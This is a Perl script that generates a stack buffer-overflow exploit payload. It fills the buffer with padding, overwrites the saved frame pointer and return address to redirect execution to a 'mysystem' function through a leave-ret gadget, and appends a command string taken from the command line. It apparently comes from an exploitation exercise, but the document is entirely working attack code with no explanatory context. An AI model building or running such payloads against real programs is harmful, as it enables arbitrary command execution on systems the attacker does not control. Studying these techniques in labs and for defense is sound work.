#!/usr/bin/perl

use strict;
 
my $buf_addr = unpack("N", pack("H*", $ARGV[0]));   # Address to buf
my $sfp_addr = unpack("N", pack("H*", $ARGV[1]));   # Address to SFP
my $sfp_val  = unpack("N", pack("H*", $ARGV[2]));   # Value of SFP
my $lret_addr = unpack("N", pack("H*", $ARGV[3]));  # Address to leave ret chunk
my $mysys_addr = unpack("N", pack("H*", $ARGV[4])); # Address to mysystem
my $cmd_path = $ARGV[5];                            # Command to execute

my $sip_addr = $sfp_addr + 4;
my $cmd_addr = $sip_addr + 12;

printf STDERR ("buf_addr=%08x\n", $buf_addr);
printf STDERR ("sfp_addr=%08x\n", $sfp_addr);
printf STDERR ("sfp_val=%08x\n", $sfp_val);
printf STDERR ("leave ret addr=%08x\n", $lret_addr);
printf STDERR ("mysystem addr=%08x\n", $mysys_addr);
printf STDERR ("command path=%s\n", $cmd_path);

print pack("C*", (0x33) x ($sfp_addr - $buf_addr)) # Padding
    . pack("V*", $sfp_val)    # Saved Frame address
    . pack("V*", $mysys_addr) # Return address of the frame.
    . pack("V*", $lret_addr)  # Pointer to leave ret
    . pack("V*", $cmd_addr)   # Pointer to the path
    . "$cmd_path"             # Command to execute
    . pack("C*", (0x00) x 1)  # null character
    ;
